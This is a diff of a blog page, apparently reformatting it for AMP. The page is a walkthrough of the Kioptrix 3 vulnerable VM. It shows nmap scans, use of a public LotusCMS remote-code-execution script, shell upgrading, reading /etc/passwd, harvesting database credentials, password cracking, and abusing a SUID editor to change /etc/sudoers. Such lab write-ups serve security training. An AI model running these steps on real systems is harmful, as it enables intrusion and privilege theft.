@@ -1,28 +1,14 @@
 <!DOCTYPE html>
-<html>
+<html ⚡>
 <head>
-    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <script>
-        // UNCOMMENT AND USE YOUR VARIABLES FOR DISQUS AND GOOGLE ANALYTICS
-        var d_id  = 'rootshellz',
-        //     g_id  = 'UA-XXXXXXXX-X', // Format: UA-########-#, Example: UA-11220899-1
-        //     g_url = 'XXXXXXX.XXX' // Format: #####.####, Example: webdesignporto.com
-    </script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <title>Kioptrix: Level 1.2 (#3) Walkthrough</title>
-
-    <meta name="HandheldFriendly" content="True" />
-    <meta name="MobileOptimized" content="320" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-    <link rel="stylesheet" type="text/css" href="/assets/highlighter/prettify.css?v=8d33012fb0" />
-    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=8d33012fb0" />
 
     <link rel="icon" href="/favicon.png" type="image/png" />
     <link rel="canonical" href="https://blog.rootshellz.com/kioptrix-walkthrough-3/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
-    <link rel="amphtml" href="https://blog.rootshellz.com/kioptrix-walkthrough-3/amp/" />
     
     <meta property="og:site_name" content="rootshellz" />
     <meta property="og:type" content="article" />
@@ -99,57 +85,598 @@
 
     <meta name="generator" content="Ghost 3.36" />
     <link rel="alternate" type="application/rss+xml" title="rootshellz" href="https://blog.rootshellz.com/rss/" />
-    <!-- https://www.jsdelivr.com/package/npm/prism-themes?path=themes -->
-<!-- These three work together / are additive -->
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-synthwave84.css" rel="stylesheet" / >
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-vsc-dark-plus.css" rel="stylesheet" / >
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-xonokai.css" rel="stylesheet" / >
 
+    <style amp-custom>
+    *,
+    *::before,
+    *::after {
+        box-sizing: border-box;
+    }
 
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-TM0JKQZ7H1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    html {
+        overflow-x: hidden;
+        overflow-y: scroll;
+        font-size: 62.5%;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    }
 
-  gtag('config', 'G-TM0JKQZ7H1');
-</script>
+    body {
+        min-height: 100vh;
+        margin: 0;
+        padding: 0;
+        color: #3a4145;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.7rem;
+        line-height: 1.55em;
+        font-weight: 400;
+        font-style: normal;
+        background: #fff;
+        scroll-behavior: smooth;
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
 
-    <script>
-      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    p,
+    ul,
+    ol,
+    li,
+    dl,
+    dd,
+    hr,
+    pre,
+    form,
+    table,
+    video,
+    figure,
+    figcaption,
+    blockquote {
+        margin: 0;
+        padding: 0;
+    }
 
-      ga('create', g_id, g_url);
-      ga('send', 'pageview');
+    ul[class],
+    ol[class] {
+        padding: 0;
+        list-style: none;
+    }
 
-    </script>
+    img {
+        display: block;
+        max-width: 100%;
+    }
+
+    input,
+    button,
+    select,
+    textarea {
+        font: inherit;
+        -webkit-appearance: none;
+    }
+
+    fieldset {
+        margin: 0;
+        padding: 0;
+        border: 0;
+    }
+
+    label {
+        display: block;
+        font-size: 0.9em;
+        font-weight: 700;
+    }
+
+    hr {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 1px;
+        border: 0;
+        border-top: 1px solid currentcolor;
+        opacity: 0.1;
+    }
+
+    ::selection {
+        text-shadow: none;
+        background: #cbeafb;
+    }
+
+    mark {
+        background-color: #fdffb6;
+    }
+
+    small {
+        font-size: 80%;
+    }
+
+    sub,
+    sup {
+        position: relative;
+        font-size: 75%;
+        line-height: 0;
+        vertical-align: baseline;
+    }
+    sup {
+        top: -0.5em;
+    }
+    sub {
+        bottom: -0.25em;
+    }
+
+    ul li + li {
+        margin-top: 0.6em;
+    }
+
+    a {
+        color: #1292EE;
+        text-decoration-skip-ink: auto;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+        margin: 0;
+        font-weight: 700;
+        color: #121212;
+        line-height: 1.4em;
+    }
+
+    h1 {
+        font-size: 3.4rem;
+        line-height: 1.1em;
+    }
+
+    h2 {
+        font-size: 2.4rem;
+        line-height: 1.2em;
+    }
+
+    h3 {
+        font-size: 1.8rem;
+    }
+
+    h4 {
+        font-size: 1.7rem;
+    }
+
+    h5 {
+        font-size: 1.6rem;
+    }
+
+    h6 {
+        font-size: 1.6rem;
+    }
+
+    amp-img {
+        height: 100%;
+        width: 100%;
+        max-width: 100%;
+        max-height: 100%;
+    }
+
+    amp-img img {
+        object-fit: cover;
+    }
+
+    .page-header {
+        padding: 50px 5vmin 30px;
+        text-align: center;
+        font-size: 2rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .page-header a {
+        color: #121212;
+        font-weight: 700;
+        text-decoration: none;
+        font-size: 1.6rem;
+        letter-spacing: -0.1px;
+    }
+
+    .post {
+        max-width: 680px;
+        margin: 0 auto;
+    }
+
+    .post-header {
+        margin: 0 5vmin 5vmin;
+        text-align: center;
+    }
+
+    .post-meta {
+        margin: 1rem 0 0 0;
+        text-transform: uppercase;
+        color: #738a94;
+        font-weight: 500;
+        font-size: 1.3rem;
+    }
+
+    .post-image {
+        margin: 0 0 5vmin;
+    }
+
+    .post-image img {
+        display: block;
+        width: 100%;
+        height: auto;
+    }
+
+    .post-content {
+        padding: 0 5vmin;
+    }
+
+    .post-content > * + * {
+        margin-top: 1.5em;
+    }
+
+    .post-content [id]:not(:first-child) {
+        margin: 2em 0 0;
+    }
+
+    .post-content > [id] + * {
+        margin-top: 1rem;
+    }
+
+    .post-content [id] + .kg-card,
+    .post-content blockquote + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content > ul,
+    .post-content > ol,
+    .post-content > dl {
+        padding-left: 1.9em;
+    }
+
+    .post-content hr {
+        margin-top: 40px;
+    }
+
+    .post .post-content hr + * {
+        margin-top: 40px;
+    }
+
+    .post-content amp-img {
+        background-color: #f8f8f8;
+    }
+
+    .post-content blockquote {
+        position: relative;
+        font-style: italic;
+    }
+
+    .post-content blockquote::before {
+        content: "";
+        position: absolute;
+        left: -1.5em;
+        top: 0;
+        bottom: 0;
+        width: 0.3rem;
+        background: #000;
+    }
+
+    .post-content :not(.kg-card):not([id]) + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content .kg-card + :not(.kg-card) {
+        margin-top: 40px;
+    }
+
+    .kg-card figcaption {
+        padding: 1.5rem 1.5rem 0;
+        text-align: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.4em;
+        opacity: 0.6;
+    }
+
+    .kg-card figcaption strong {
+        color: rgba(0,0,0,0.8);
+    }
+
+    .post-content :not(pre) code {
+        vertical-align: middle;
+        padding: 0.15em 0.4em 0.15em;
+        border: #e1eaef 1px solid;
+        font-weight: 400;
+        font-size: 0.9em;
+        line-height: 1em;
+        color: #dc0050;
+        background: #f0f6f9;
+        border-radius: 0.25em;
+    }
+
+    .post-content > pre {
+        overflow: scroll;
+        padding: 16px 20px;
+        color: #fff;
+        background: #1F2428;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
+    }
+
+    .kg-embed-card {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+
+    .kg-image-card img {
+        margin: auto;
+    }
+
+    .kg-gallery-card + .kg-gallery-card {
+        margin-top: 0.75em;
+    }
+
+    .kg-gallery-container {
+        position: relative;
+    }
+
+    .kg-gallery-row {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+    }
+
+    .kg-gallery-image {
+        width: 100%;
+        height: 100%;
+    }
+
+    .kg-gallery-row:not(:first-of-type) {
+        margin: 0.75em 0 0 0;
+    }
+
+    .kg-gallery-image:not(:first-of-type) {
+        margin: 0 0 0 0.75em;
+    }
+
+    .kg-bookmark-card,
+    .kg-bookmark-publisher {
+        position: relative;
+    }
+
+    .kg-bookmark-container,
+    .kg-bookmark-container:hover {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: row-reverse;
+        color: currentColor;
+        background: rgba(255,255,255,0.6);
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        text-decoration: none;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+    }
+
+    .kg-bookmark-content {
+        flex-basis: 0;
+        flex-grow: 999;
+        padding: 20px;
+        order: 1;
+    }
+
+    .kg-bookmark-title {
+        font-weight: 600;
+        font-size: 1.5rem;
+        line-height: 1.3em;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        max-height: 45px;
+        margin: 0.5em 0 0 0;
+        font-size: 1.4rem;
+        line-height: 1.55em;
+        overflow: hidden;
+        opacity: 0.8;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+    }
+
+    .kg-bookmark-metadata {
+        margin-top: 20px;
+    }
+
+    .kg-bookmark-metadata {
+        display: flex;
+        align-items: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.3em;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-metadata amp-img {
+        width: 18px;
+        height: 18px;
+        max-width: 18px;
+        max-height: 18px;
+        margin-right: 10px;
+    }
+
+    .kg-bookmark-thumbnail {
+        display: flex;
+        flex-basis: 20rem;
+        flex-grow: 1;
+        justify-content: flex-end;
+    }
+
+    .kg-bookmark-thumbnail amp-img {
+        max-height: 200px;
+    }
+
+    .kg-bookmark-author {
+        white-space: nowrap;
+        text-overflow: ellipsis;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-publisher::before {
+        content: "•";
+        margin: 0 .5em;
+    }
+
+    .kg-width-full.kg-card-hascaption {
+        display: grid;
+        grid-template-columns: inherit;
+    }
+
+    .post-content table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    .post-content th {
+        padding: 0.5em 0.8em;
+        text-align: left;
+        font-size: .75em;
+        text-transform: uppercase;
+    }
+
+    .post-content td {
+        padding: 0.4em 0.7em;
+    }
+
+    .post-content tbody tr:nth-child(2n + 1) {
+        background-color: rgba(0,0,0,0.1);
+        padding: 1px;
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td:last-child {
+        box-shadow:
+            inset 1px 0 rgba(0,0,0,0.1),
+            inset -1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td {
+        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:last-child {
+        border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+
+    .page-footer {
+        padding: 60px 5vmin;
+        margin: 60px auto 0;
+        text-align: center;
+        background-color: #f8f8f8;
+    }
+
+    .page-footer h3 {
+        margin: 0.5rem 0 0 0;
+    }
+
+    .page-footer p {
+        max-width: 500px;
+        margin: 1rem auto 1.5rem;
+        font-size: 1.7rem;
+        line-height: 1.5em;
+        color: rgba(0,0,0,0.6)
+    }
+
+    .powered {
+        display: inline-flex;
+        align-items: center;
+        margin: 30px 0 0;
+        padding: 6px 9px 6px 6px;
+        border: rgba(0,0,0,0.1) 1px solid;
+        font-size: 12px;
+        line-height: 12px;
+        letter-spacing: -0.2px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        color: #222;
+        text-decoration: none;
+        background: #fff;
+        border-radius: 6px;
+    }
+
+    .powered svg {
+        height: 16px;
+        width: 16px;
+        margin: 0 6px 0 0;
+    }
+
+    @media (max-width: 600px) {
+        body {
+            font-size: 1.6rem;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+        }
+    }
+
+    @media (max-width: 400px) {
+        h1 {
+            font-size: 2.6rem;
+            line-height: 1.15em;
+        }
+        h2 {
+            font-size: 2rem;
+            line-height: 1.2em;
+        }
+        h3 {
+            font-size: 1.7rem;
+        }
+    }
+    </style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
+
 </head>
-<body class="post-template tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
 
-    
+<body class="amp-template">
+    <header class="page-header">
+        <a href="https://blog.rootshellz.com">
+                <amp-img class="site-icon" src="https://blog.rootshellz.com/content/images/2020/11/Blog-Logo.png" width="50" height="50" layout="fixed"></amp-img>
+        </a>
+    </header>
 
-<main class="content" role="main">
+    <main class="content" role="main">
+        <article class="post">
 
-    <article class="post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
+            <header class="post-header">
+                <h1 class="post-title">Kioptrix: Level 1.2 (#3) Walkthrough</h1>
+                <section class="post-meta">
+                    rootshellz -
+                    <time class="post-date" datetime="2017-09-11">11 Sep 2017</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="https://blog.rootshellz.com/content/images/2018/07/Kioptrix-3-Cover.jpeg" width="600" height="340" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
 
-        <header class="post-header">
-            <a id="blog-logo" href="https://blog.rootshellz.com">
-                    <img src="/content/images/2018/07/Blog-Logo.png" alt="Blog Logo" />
-            </a>
-        </header>
-
-
-        <span class="post-meta"><time datetime="2017-09-11">11 Sep 2017</time> on <a href="/tag/boot2root/">Boot2Root</a> | <a href="/tag/vulnhub/">VulnHub</a> | <a href="/tag/oscp/">OSCP</a> | <a href="/tag/kioptrix/">Kioptrix</a></span>
-
-        <h1 class="post-title">Kioptrix: Level 1.2 (#3) Walkthrough</h1>
-
-        <section class="post-content">
-            <!--kg-card-begin: markdown--><h1 id="intro">Intro</h1>
+                <h1 id="intro">Intro</h1>
 <p>Today I will be continuing on the the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix series</a> of vulnerable VMs.  In previous posts, I covered <a href="https://blog.rootshellz.com/kioptrix-walkthrough-1/">Kioptrix1</a> and <a href="https://blog.rootshellz.com/kioptrix-walkthrough-2/">Kioptrix1.1</a>.</p>
-<p>Per the author of the challenge, &quot;The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy.&quot;  So let's see if we can find both, shall we?</p>
+<p>Per the author of the challenge, "The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy."  So let's see if we can find both, shall we?</p>
 <h1 id="setup">Setup</h1>
 <p>The challenge description and Readme file tells us that in addition to spinning up the VM and letting DHCP assign it an address, we also need to point <strong>kioptrix3.com</strong> to the VM's IP.  The Readme also confirms this is another web challenge, which makes sense given the required name mapping.  Let's spin up the VM, find it on the network, and then point the domain name via our Kali attack box's hosts file.</p>
 <p>We use an nmap Ping scan of our local subnet to identify the target.</p>
@@ -171,7 +698,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 12.86 seconds
 </code></pre>
 <p>Process of elimination of the know addresses means 172.16.2.132 is our target.</p>
 <p>Per the Readme, let's point kioptrix3.com to 172.16.2.132:</p>
-<pre><code class="language-shell-output">root@kali:~# echo &quot;172.16.2.132  kioptrix3.com&quot; &gt;&gt; /etc/hosts
+<pre><code class="language-shell-output">root@kali:~# echo "172.16.2.132  kioptrix3.com" &gt;&gt; /etc/hosts
 </code></pre>
 <h1 id="initialscanningandenumeration">Initial Scanning and Enumeration</h1>
 <p>With out target identified and name resolution set up, let's move on to initial scanning of the VM.</p>
@@ -230,7 +757,7 @@ PORT   STATE SERVICE
 |               // Handler for .ready() called.
 |               $('body').corner();
 |               $('#footer').corner();
-|               $('#menu').corner(&quot;right&quot;);
+|               $('#menu').corner("right");
 |           });
 |           --&gt;
 |     
@@ -265,41 +792,41 @@ PORT   STATE SERVICE
 |         &lt;!--
 |         var formAction = {
 |           remember : function() {
-|             if (document.getElementById(&quot;remember&quot;).checked) {
+|             if (document.getElementById("remember").checked) {
 |               var expire = new Date();
 |               expire.setTime(expire.getTime() + 30*24*60*60*1000);
-|               var inputs = document.getElementById(&quot;commentForm&quot;).getElementsByTagName(&quot;input&quot;);
+|               var inputs = document.getElementById("commentForm").getElementsByTagName("input");
 |               var name;
 |               var website;
 |               for (var i=0; i&lt;inputs.length; i++) {
-|                 if (inputs[i].name==&quot;name&quot;) name = inputs[i].value;
-|                 else if (inputs[i].name==&quot;website&quot;) website = inputs[i].value;
+|                 if (inputs[i].name=="name") name = inputs[i].value;
+|                 else if (inputs[i].name=="website") website = inputs[i].value;
 |               }
-|               document.cookie = &quot;newsguest=&quot; + name + &quot;,&quot; + website + &quot;; expires=&quot; + expire.toGMTString();
+|               document.cookie = "newsguest=" + name + "," + website + "; expires=" + expire.toGMTString();
 |             }
 |           },
 |           fill : function() {
 |             var cookie = document.cookie;
-|             var newsguest = &quot;newsguest=&quot;;
+|             var newsguest = "newsguest=";
 |             var begin = cookie.indexOf(newsguest);
 |             if (begin&gt;-1) {
 |               begin += newsguest.length;
-|               var end = cookie.indexOf(&quot;;&quot;, begin);
+|               var end = cookie.indexOf(";", begin);
 |               if (end==-1) end = cookie.length;
-|               var guests = cookie.substring(begin, end).split(&quot;,&quot;);
-|               var inputs = document.getElementById(&quot;commentForm&quot;).getElementsByTagName(&quot;input&quot;);
+|               var guests = cookie.substring(begin, end).split(",");
+|               var inputs = document.getElementById("commentForm").getElementsByTagName("input");
 |               for (var i=0; i&lt;inputs.length; i++) {
-|                 if (inputs[i].name==&quot;name&quot;) inputs[i].value = guests[0];
-|                 else if (inputs[i].name==&quot;website&quot;) inputs[i].value = guests[1];
+|                 if (inputs[i].name=="name") inputs[i].value = guests[0];
+|                 else if (inputs[i].name=="website") inputs[i].value = guests[1];
 |               }
 |             }
 |           },
 |           validate : function() {
-|             var inputs = document.getElementById(&quot;commentForm&quot;).getElementsByTagName(&quot;input&quot;);
+|             var inputs = document.getElementById("commentForm").getElementsByTagName("input");
 |             for (var i=0; i&lt;inputs.length; i++) {
-|               if (inputs[i].name==&quot;name&quot; &amp;&amp; inputs[i].value=='') return false;
+|               if (inputs[i].name=="name" &amp;&amp; inputs[i].value=='') return false;
 |             }
-|             return (document.getElementById(&quot;commentForm&quot;).getElementsByTagName(&quot;textarea&quot;)[0].value!='');
+|             return (document.getElementById("commentForm").getElementsByTagName("textarea")[0].value!='');
 |           },
 |           submit : function() {
 |             if (this.validate()) {
@@ -322,7 +849,7 @@ PORT   STATE SERVICE
 |     Path: http://kioptrix3.com/gallery/index.php
 |     Line number: 48
 |     Comment: 
-|         &lt;!--  &lt;a href=&quot;gadmin&quot;&gt;Admin&lt;/a&gt;&amp;nbsp;&amp;nbsp; --&gt;
+|         &lt;!--  &lt;a href="gadmin"&gt;Admin&lt;/a&gt;&amp;nbsp;&amp;nbsp; --&gt;
 |     
 |     Path: http://kioptrix3.com/gallery/g.php/1
 |     Line number: 47
@@ -468,12 +995,12 @@ PORT   STATE SERVICE
 |     http://kioptrix3.com/index.php?page=loginSubmit%27%20OR%20sqlspider&amp;system=Admin
 |     http://kioptrix3.com/gallery/themes/black/slideshow.php?pause=%27%20OR%20sqlspider
 |     http://kioptrix3.com/gallery/themes/black/%20%22slideshow.php?pause=%22%27%20OR%20sqlspider
-|     http://kioptrix3.com/gallery/themes/black/path+%22gallery.php?id=%22%2bgallery_id%2b%22%27%20OR%20sqlspider&amp;sort=%22%2bfield%2b%22#photos&quot;;
-|     http://kioptrix3.com/gallery/themes/black/path+%22gallery.php?id=%22%2bgallery_id%2b%22&amp;sort=%22%2bfield%2b%22%27%20OR%20sqlspider#photos&quot;;
+|     http://kioptrix3.com/gallery/themes/black/path+%22gallery.php?id=%22%2bgallery_id%2b%22%27%20OR%20sqlspider&amp;sort=%22%2bfield%2b%22#photos";
+|     http://kioptrix3.com/gallery/themes/black/path+%22gallery.php?id=%22%2bgallery_id%2b%22&amp;sort=%22%2bfield%2b%22%27%20OR%20sqlspider#photos";
 |     http://kioptrix3.com/gallery/themes/black/tags.php?tag=%27%20OR%20sqlspider
 |     http://kioptrix3.com/gallery/themes/black/%20%22slideshow.php?id=%22%27%20OR%20sqlspider
-|     http://kioptrix3.com/gallery/themes/black/%20%22tags.php?sort=%22%2bfield%2b%22%27%20OR%20sqlspider&amp;tag=%22%2btag%2b%22#photos&quot;;
-|     http://kioptrix3.com/gallery/themes/black/%20%22tags.php?sort=%22%2bfield%2b%22&amp;tag=%22%2btag%2b%22%27%20OR%20sqlspider#photos&quot;;
+|     http://kioptrix3.com/gallery/themes/black/%20%22tags.php?sort=%22%2bfield%2b%22%27%20OR%20sqlspider&amp;tag=%22%2btag%2b%22#photos";
+|     http://kioptrix3.com/gallery/themes/black/%20%22tags.php?sort=%22%2bfield%2b%22&amp;tag=%22%2btag%2b%22%27%20OR%20sqlspider#photos";
 |     http://kioptrix3.com/gallery/themes/black/slideshow.php?id=%27%20OR%20sqlspider
 |     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider
 |     http://kioptrix3.com/index.php?page=index%27%20OR%20sqlspider
@@ -495,14 +1022,14 @@ Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds
 </ul>
 <h1 id="webappfingerprinting">Web App Fingerprinting</h1>
 <p>Let's manually map the application a bit via our browser and Burp.  We will simply proxy our browser through Burp with Intercept turned off.  This will allow us to quickly click around the web app and then inspect the requests and responses.</p>
-<p>One of the first things we can see is the web application is running something called LotusCMS:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/09/Burp-LotusCMS-1.png" alt="Burp-LotusCMS-1"></p>
-<p>I've never heard of LotusCMS, but let's see what <a href="https://www.exploit-db.com/">Exploit DB</a> can tell us about it:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/09/ExploitDB-LotusCMS.png" alt="ExploitDB-LotusCMS"></p>
+<p>One of the first things we can see is the web application is running something called LotusCMS:<br />
+</p>
+<p>I've never heard of LotusCMS, but let's see what <a href="https://www.exploit-db.com/">Exploit DB</a> can tell us about it:<br />
+</p>
 <h1 id="rce">RCE</h1>
 <p>RCE spotted (assuming the vulnerable version of the CMS)!  The ExploitDB page for the Metasploit module references <a href="https://secuniaresearch.flexerasoftware.com/secunia_research/2011-21/">https://secuniaresearch.flexerasoftware.com/secunia_research/2011-21/</a>, which is a decent summary of the issue.  The jist is that arbitrary PHP code execution is possible due to two separate issues in the CMS' code.  Both issues are caused by incorrectly implemented input sanitization with the input being passed to the PHP eval() statement.  This effectively provides system-level RCE by injecting PHP system() calls.</p>
-<p>Let's see if we can find a stand-alone exploit script, instead of using Metasploit.<br>
-<img src="https://blog.rootshellz.com/content/images/2017/09/Google-LotusCMS-RCE.png" alt="Google-LotusCMS-RCE"></p>
+<p>Let's see if we can find a stand-alone exploit script, instead of using Metasploit.<br />
+</p>
 <p>The <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">repo</a> contains both <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">Bash</a> and <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.rb">Ruby</a> stand-alone exploitation scripts.  Thanks <a href="https://github.com/Hood3dRob1n">Hood3dRob1n</a>!  Let's go for the Bash script...  After a quick review, we verify that the script is safe to run and understand its functionality.  When run, the script will check that we have a vulnerable target, ask us to select from a menu of payloads, and then run the exploit.  Interestingly, it appears Hood3dRob1n wrote this script with Kioptrix #3 (1.2) in mind.</p>
 <h2 id="exploitingtherce">Exploiting the RCE</h2>
 <p>We start our listener:</p>
@@ -558,7 +1085,7 @@ cat /etc/*release*
 DISTRIB_ID=Ubuntu
 DISTRIB_RELEASE=8.04
 DISTRIB_CODENAME=hardy
-DISTRIB_DESCRIPTION=&quot;Ubuntu 8.04.3 LTS&quot;
+DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"
 </code></pre>
 <p>From here, let's see what users we have on the system:</p>
 <pre><code class="language-shell-output">cat /etc/passwd
@@ -664,7 +1191,7 @@ Options:
 For more information, see:
   http://www.trapkit.de/tools/checksec.html
 </code></pre>
-<p>Well, that is all very interesting.  We have a couple of references to the <em>ht</em> application as well as a script, that per the [link](<a href="http://www.trapkit.de/tools/checksec.html">http://www.trapkit.de/tools/checksec.html</a> from the help dialogue, &quot;is designed to test what standard Linux OS and PaX security features are being used.&quot;  On a hunch, what if we check the security on the the ht executable?</p>
+<p>Well, that is all very interesting.  We have a couple of references to the <em>ht</em> application as well as a script, that per the [link](<a href="http://www.trapkit.de/tools/checksec.html">http://www.trapkit.de/tools/checksec.html</a> from the help dialogue, "is designed to test what standard Linux OS and PaX security features are being used."  On a hunch, what if we check the security on the the ht executable?</p>
 <pre><code class="language-shell-output">which ht
 /usr/local/bin/ht
 
@@ -679,7 +1206,7 @@ ht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011
 <p>First, we notice the file is owned by root and has the SUID bit set along with word-executable permissions.  This means that anyone can run this executable file and when they do, it will assume the effective UID of root (0).  Given that this appears to be an editor, I think we have found our way in.</p>
 <pre><code class="language-shell-output">ht /etc/shadow
 
-python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
+python -c 'import pty; pty.spawn("/bin/sh")'
 
 $ ht /etc/shadow
 ht /etc/shadow
@@ -726,15 +1253,15 @@ grep password ./*
 $ grep password ./*/*
 grep password ./*/*
 ./gallery/db.sql:  `password` varchar(100) NOT NULL default '',
-./gallery/gconfig.php:  $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;
+./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
 [... snip ...]
 
 $ grep gallarific_mysql ./*/*
 grep gallarific_mysql ./*/*
-./gallery/gconfig.php:  $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;
-./gallery/gconfig.php:  $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;
-./gallery/gconfig.php:  $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;
-./gallery/gconfig.php:  $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;
+./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_server"] = "localhost";
+./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_database"] = "gallery";
+./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_username"] = "root";
+./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
 [... snip ...]
 </code></pre>
 <p>Hmm, that seems helpful.  Let's see what is stored in the DB:</p>
@@ -801,8 +1328,8 @@ select * from gallarific_users;
 </code></pre>
 <p>Most interesting here is the password hash for loneferret in the dev_accounts table.  Users are known to reuse passwords, so if we can crack this hash, we may be able to use the password to SSH to the target as the loneferret user.</p>
 <h2 id="passwordhashcracking">Password Hash Cracking</h2>
-<p>Instead of cracking locally, let's see if any of the online hash-crackers can help us:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/09/CrackStation-starwars-1.png" alt="CrackStation-starwars-1"></p>
+<p>Instead of cracking locally, let's see if any of the online hash-crackers can help us:<br />
+</p>
 <p>Awesome, <a href="https://crackstation.net/">CrackStation</a> was able to easily crack loneferret's password.</p>
 <h2 id="becomingloneferret">Becoming loneferret</h2>
 <p>We now have the lonferret user's Gallerific web application password, but that doesn't seem to help us much in getting root on the box.  However, maybe the user reused the same password for his local account on the server.  Let's find out:</p>
@@ -841,8 +1368,8 @@ loneferret@Kioptrix3:~$ ht /etc/sudoers
 
 loneferret@Kioptrix3:~$ ht /etc/sudoers
 </code></pre>
